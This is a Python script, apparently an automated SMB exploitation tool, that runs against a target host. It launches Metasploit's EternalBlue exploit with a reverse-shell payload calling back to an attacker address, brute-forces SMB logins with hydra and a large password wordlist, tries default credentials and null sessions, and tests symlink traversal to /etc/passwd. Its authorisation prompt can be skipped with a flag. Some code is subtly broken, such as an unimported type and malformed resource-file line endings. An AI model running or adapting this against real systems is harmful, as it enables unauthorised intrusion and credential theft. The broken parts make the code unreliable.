#!/usr/bin/env python3
import json
import subprocess
import requests
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Optional
import sys
import urllib3
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
ROCKYOU_PATH = Path("/usr/share/wordlists/rockyou.txt")
COMMON_PASSWORDS_PATH = OUTPUT_DIR / "commonpasswords.txt"
USERS_PATH = OUTPUT_DIR / "usernames.txt"
POST_EXPLOITATION_METADATA = OUTPUT_DIR / "post_exploitation_metadata.json"
EXPLOIT_JSON = "{target}_smb_exploit.json"
EXPLOIT_MD = "{target}_smb_exploit.md"

DEFAULT_CREDENTIALS = [
    ("administrator", ""),
    ("admin", "admin"),
    ("administrator", "administrator"),
    ("admin", "password"),
    ("guest", ""),
    ("guest", "guest"),
    ("user", "user"),
    ("test", "test"),
    ("smb", "smb"),
    ("share", "share")
]

def setup_common_passwords() -> None:
    """Create a small commonpasswords.txt if it doesn't exist."""
    if not COMMON_PASSWORDS_PATH.exists():
        OUTPUT_DIR.mkdir(exist_ok=True)
        common_passwords = [
            "password", "admin", "administrator", "admin123", "123456", "password123", "welcome", "letmein",
            "12345678", "qwerty", "abc123", "password1", "admin1", "guest", "smb", "share"
        ]
        with COMMON_PASSWORDS_PATH.open("w", encoding='utf-8') as f:
            f.write("\n".join(common_passwords))
        logger.info(f"Created {COMMON_PASSWORDS_PATH}")

def setup_usernames() -> None:
    """Create usernames.txt if it doesn't exist."""
    if not USERS_PATH.exists():
        OUTPUT_DIR.mkdir(exist_ok=True)
        usernames = ["administrator", "admin", "guest", "user", "test", "smb", "share", "webadmin"]
        with USERS_PATH.open("w", encoding='utf-8') as f:
            f.write("\n".join(usernames))
        logger.info(f"Created {USERS_PATH}")

def run_command(cmd: List[str], timeout: int = 180, shell: bool = False) -> tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), True
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def clean_ansi_codes(text: str) -> str:
    """Remove ANSI escape codes from text."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

# --- SMB Specific Exploit Functions ---
def exploit_ms17_010(target: str, port: int, attacker_ip: str, attacker_port: int) -> Optional[Dict]:
    """Attempts to exploit MS17-010 (EternalBlue) using Metasploit."""
    logger.info("Attempting to exploit MS17-010 (EternalBlue)...")
    msf_script_path = OUTPUT_DIR / f"{target}_{port}_ms17_010.rc"
    with msf_script_path.open("w") as f:
        f.write("use exploit/windows/smb/ms17_010_eternalblue\\n")
        f.write(f"set RHOSTS {target}\\n")
        f.write(f"set RPORT {port}\\n")
        f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\\n")
        f.write(f"set LHOST {attacker_ip}\\n")
        f.write(f"set LPORT {attacker_port}\\n")
        f.write("run\\n")
        f.write("exit\\n")
    
    msf_cmd = ["msfconsole", "-q", "-r", str(msf_script_path)]
    output, success = run_command(msf_cmd)
    
    msf_script_path.unlink() # Clean up

    if "session opened" in output:
        return {
            "type": "smb_ms17_010_eternalblue",
            "severity": "Critical",
            "impact": "Remote Code Execution as SYSTEM.",
            "details": "Successfully exploited MS17-010 (EternalBlue) and opened a Meterpreter session.",
            "proof": f"Metasploit Output Snippet:\\n{output[output.find('session opened'):]}",
            "poc": f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run'",
            "recommendation": "Patch the system for MS17-010 immediately. This is a critical vulnerability."
        }
    return None

def test_smb_brute_force(target: str, port: int, use_rockyou: bool, custom_wordlist: Optional[str]) -> Optional[Dict]:
    """Brute-force SMB credentials using hydra."""
    password_file = ROCKYOU_PATH if use_rockyou and ROCKYOU_PATH.exists() else COMMON_PASSWORDS_PATH
    if not password_file.exists():
        logger.error(f"Password file {password_file} not found. Falling back to default credentials.")
        return None
    
    hydra_cmd = f"hydra -L {USERS_PATH} -P {password_file} {target} smb -s {port} -t 4 -w 10"
    output, success = run_command(hydra_cmd, timeout=600, shell=True)
    if success and "password:" in output:
        match = re.search(r"\[445\]\[smb\] host: .* login: (\S+) password: (\S+)", output)
        if match:
            username, password = match.groups()
            logger.info(f"Success: SMB {target}:{port} with {username}:{password}")
            poc = f"smbclient -L //{target}/ -U {username}%{password}"
            return {
                "type": "smb_brute_force",
                "severity": "High",
                "impact": "Unauthorized access to files and sensitive information.",
                "details": f"Credentials {username}:{password} ({'rockyou.txt' if use_rockyou else 'commonpasswords.txt'})",
                "proof": f"Hydra Output Snippet:\\n{output}",
                "poc": poc,
                "recommendation": "Change default credentials and enable strong password policies."
            }
    logger.error(f"Brute-force failed for {target}:{port}")
    return None

def test_smb_anonymous_access(target: str, port: str) -> Tuple[bool, str]:
    """Test for anonymous SMB access."""
    smb_cmd = f"smbclient -L //{target}/ -N"
    output, success = run_command(smb_cmd, shell=True)
    if success and "Sharename" in output and "Disk" in output:
        logger.info(f"Anonymous SMB access successful: {target}:{port}")
        poc = f"smbclient -L //{target}/ -N"
        return True, poc
    return False, ""

def test_smb_default_credentials(target: str, port: str) -> Tuple[str, str, str]:
    """Test default credentials for SMB."""
    for username, password in DEFAULT_CREDENTIALS:
        smb_cmd = f"smbclient -L //{target}/ -U {username}%{password}"
        output, success = run_command(smb_cmd, shell=True)
        if success and "Sharename" in output and "Disk" in output:
            logger.info(f"Success: {target}:{port} with {username}:{password}")
            poc = f"smbclient -L //{target}/ -U {username}%{password}"
            return username, password, poc
    logger.error(f"No default credentials worked for {target}:{port}")
    return None, None, ""

def test_smb_shares(target: str, port: str, username: str = None, password: str = None) -> List[Dict]:
    """Test SMB shares access."""
    vulnerabilities = []
    
    if username and password:
        smb_cmd = f"smbclient -L //{target}/ -U {username}%{password}"
    else:
        smb_cmd = f"smbclient -L //{target}/ -N"
    
    output, success = run_command(smb_cmd, shell=True, timeout=60)
    if success and "Sharename" in output:
        # Extract share names
        shares = re.findall(r"(\S+)\s+Disk", output)
        for share in shares:
            if share not in ["IPC$", "ADMIN$"]:  # Skip system shares
                vulnerabilities.append({
                    "type": "SMB Share Access",
                    "target": f"{target}:{port}",
                    "details": f"Accessible share: {share}",
                    "poc": f"smbclient //{target}/{share} -U {username}%{password}" if username else f"smbclient //{target}/{share} -N"
                })
    
    return vulnerabilities

def test_smb_eternal_blue(target: str, port: str) -> Tuple[bool, str]:
    """Test for EternalBlue vulnerability."""
    # Check if target is vulnerable to EternalBlue
    eternal_blue_cmd = f"nmap --script smb-vuln-ms17-010 -p {port} {target}"
    output, success = run_command(eternal_blue_cmd, shell=True)
    if success and "VULNERABLE" in output:
        logger.info(f"EternalBlue vulnerability found: {target}:{port}")
        poc = f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set RPORT {port}; run'"
        return True, poc
    return False, ""

def test_smb_netbios_enumeration(target: str, port: str) -> List[Dict]:
    """Enumerate NetBIOS information."""
    vulnerabilities = []
    
    # Use nmblookup for NetBIOS enumeration
    nmb_cmd = f"nmblookup -A {target}"
    output, success = run_command(nmb_cmd, shell=True)
    if success and output.strip():
        vulnerabilities.append({
            "type": "NetBIOS Enumeration",
            "target": f"{target}:{port}",
            "details": "NetBIOS information enumerated",
            "poc": f"nmblookup -A {target}"
        })
    
    return vulnerabilities

def test_smb_null_sessions(target: str, port: str) -> Tuple[bool, str]:
    """Test for null session vulnerability."""
    null_cmd = f"rpcclient -U '' -N {target}"
    output, success = run_command(null_cmd, shell=True)
    if success and "rpcclient" in output:
        logger.info(f"Null session successful: {target}:{port}")
        poc = f"rpcclient -U '' -N {target}"
        return True, poc
    return False, ""

def test_smb_user_enumeration(target: str, port: str) -> List[Dict]:
    """Enumerate SMB users."""
    vulnerabilities = []
    
    # Use enum4linux for user enumeration
    enum_cmd = f"enum4linux -U {target}"
    output, success = run_command(enum_cmd, shell=True)
    if success and "user:" in output:
        vulnerabilities.append({
            "type": "User Enumeration",
            "target": f"{target}:{port}",
            "details": "SMB users enumerated",
            "poc": f"enum4linux -U {target}"
        })
    
    return vulnerabilities

def test_smb_group_enumeration(target: str, port: str) -> List[Dict]:
    """Enumerate SMB groups."""
    vulnerabilities = []
    
    # Use enum4linux for group enumeration
    enum_cmd = f"enum4linux -G {target}"
    output, success = run_command(enum_cmd, shell=True)
    if success and "group:" in output:
        vulnerabilities.append({
            "type": "Group Enumeration",
            "target": f"{target}:{port}",
            "details": "SMB groups enumerated",
            "poc": f"enum4linux -G {target}"
        })
    
    return vulnerabilities

def test_smb_os_detection(target: str, port: str) -> Tuple[bool, str]:
    """Detect SMB OS version."""
    os_cmd = f"enum4linux -o {target}"
    output, success = run_command(os_cmd, shell=True, timeout=60)
    if success and output.strip():
        logger.info(f"OS detection successful: {target}:{port}")
        poc = f"enum4linux -o {target}"
        return True, poc
    return False, ""

def test_smb_symlink_traversal(target: str, port: str, username: str = None, password: str = None) -> Tuple[bool, str]:
    """Test SMB symlink traversal vulnerability."""
    # Test symlink traversal using Metasploit module
    msf_cmd = [
        "msfconsole", "-q", "-x",
        f"use auxiliary/admin/smb/samba_symlink_traversal; set RHOSTS {target}; set RPORT {port}; run; exit"
    ]
    output, success = run_command(msf_cmd, timeout=300)
    if success and ("success" in output.lower() or "vulnerable" in output.lower()):
        logger.info(f"SMB symlink traversal found: {target}:{port}")
        poc = f"msfconsole -q -x 'use auxiliary/admin/smb/samba_symlink_traversal; set RHOSTS {target}; set RPORT {port}; run'"
        return True, poc
    
    # Alternative test using smbclient
    if username and password:
        symlink_cmd = f"smbclient //{target}/tmp -U {username}%{password} -c 'mkdir test; cd test; ln -s /etc/passwd passwd'"
    else:
        symlink_cmd = f"smbclient //{target}/tmp -N -c 'mkdir test; cd test; ln -s /etc/passwd passwd'"
    
    output2, success2 = run_command(symlink_cmd, shell=True, timeout=60)
    if success2 and "NT_STATUS_SUCCESS" in output2:
        logger.info(f"SMB symlink traversal via smbclient: {target}:{port}")
        poc = symlink_cmd
        return True, poc
    
    return False, ""

def save_metadata(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploitation metadata to JSON."""
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    OUTPUT_DIR.mkdir(exist_ok=True)
    with POST_EXPLOITATION_METADATA.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploitation metadata to {POST_EXPLOITATION_METADATA}")

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploit report to JSON and Markdown."""
    json_path = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    md_path = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    
    # Save JSON
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploit JSON to {json_path}")
    
    # Save Markdown
    lines = [f"# SMB Exploit Report for {target}:{port}\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    for exploit in exploits:
        lines.append(f"## {exploit['type']}\n")
        lines.append(f"- **Target**: {exploit['target']}\n")
        lines.append(f"- **Details**: {exploit['details']}\n")
        lines.append(f"- **PoC**: `{exploit['poc']}`\n\n")
        if "shell_paths" in exploit:
            lines.append("### Shell Paths\n")
            for path in exploit["shell_paths"]:
                lines.append(f"- {path}\n")
        if "failed_attempts" in exploit:
            lines.append("### Failed Attempts\n")
            for attempt in exploit["failed_attempts"]:
                lines.append(f"- {attempt}\n")
    
    with md_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(lines))
    logger.info(f"Saved exploit Markdown to {md_path}")

# --- Main Orchestration ---
def exploit_target(metadata: Dict, attacker_ip: str, attacker_port: int, use_rockyou: bool, custom_wordlist: Optional[str]) -> List[Dict]:
    target = metadata["target"]
    port = metadata["port"]
    exploits = []

    # 1. Prioritize MS17-010 if recon found it
    if metadata.get("is_vulnerable_to_ms17_010"):
        ms17_exploit = exploit_ms17_010(target, port, attacker_ip, attacker_port)
        if ms17_exploit:
            exploits.append(ms17_exploit)
            return exploits # Stop here, this is the highest impact exploit

    # 2. Report on Anonymous Share Access if found
    if metadata.get("allows_anonymous_login"):
        exploits.append({
            "type": "smb_anonymous_share_access",
            "severity": "High",
            "impact": "Unauthorized access to files and sensitive information.",
            "details": "Anonymous or Guest access to SMB shares is permitted.",
            "proof": f"Reconnaissance confirmed access. Accessible shares:\\n{chr(10).join(metadata.get('discovered_shares', []))}",
            "poc": f"smbclient -L //{target}/ -N",
            "recommendation": "Disable anonymous and guest access to all SMB shares."
        })
        # We can continue to other tests even if this is found

    # 3. Brute-force as a last resort
    brute_exploit = test_smb_brute_force(target, port, use_rockyou, custom_wordlist)
    if brute_exploit:
        exploits.append(brute_exploit)

    return exploits

# --- Reporting ---
def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the first SMB metadata file for the target and extract port."""
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_netbios-ssn_*_metadata.json"))
    if not metadata_files:
        logger.error(f"No SMB metadata files found for {target}. Expected pattern: {OUTPUT_DIR}/{target}_netbios-ssn_*_metadata.json")
        return None, ""
    
    metadata_file = metadata_files[0]
    logger.info(f"Found metadata file: {metadata_file}")
    
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
        port = metadata.get("port", "445")  # Default to 445 if port not in metadata
        logger.info(f"Using port {port} from metadata")
        return metadata_file, port
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding {metadata_file}: {e}")
        port = "445"
        logger.info(f"Falling back to default port {port}")
        return metadata_file, port
    except Exception as e:
        logger.error(f"Error reading {metadata_file}: {e}")
        return None, ""

def main():
    """Main function to parse arguments and run exploits."""
    parser = argparse.ArgumentParser(description="Automated SMB exploitation script")
    parser.add_argument("target", help="Target domain or IP (e.g., 192.168.1.35)")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--use-rockyou", action="store_true", help="Use rockyou.txt for brute-forcing")
    parser.add_argument("--no-confirm", action="store_true", help="Skip user confirmation")
    args = parser.parse_args()

    # Legal warning
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only. Unauthorized exploitation is illegal and unethical.")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    # Check dependencies
    logger.info("Checking dependencies...")
    for tool in ["hydra", "smbclient", "enum4linux", "rpcclient", "nmblookup", "msfconsole"]:
        if not shutil.which(tool):
            logger.error(f"{tool} not found. Install it (e.g., sudo apt install {tool.replace('msfconsole', 'metasploit-framework')}).")
            sys.exit(1)

    # Find SMB metadata file
    json_path, port = find_metadata_file(args.target)
    if not json_path or not port:
        logger.error(f"Failed to find SMB metadata file for {args.target}. Ensure recon.py ran successfully.")
        sys.exit(1)

    # Load metadata
    try:
        with json_path.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding {json_path}: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Error loading {json_path}: {e}")
        sys.exit(1)

    # Run exploits
    logger.info(f"Starting exploitation for {args.target}:{port}...")
    exploits = exploit_target(metadata, args.attacker_ip, int(args.attacker_port), args.use_rockyou, None) # Pass None for custom_wordlist

    # Save results
    save_metadata(exploits, args.target, port)
    save_exploit_report(exploits, args.target, port)
    logger.info("SMB exploitation complete.")

if __name__ == "__main__":
    main() 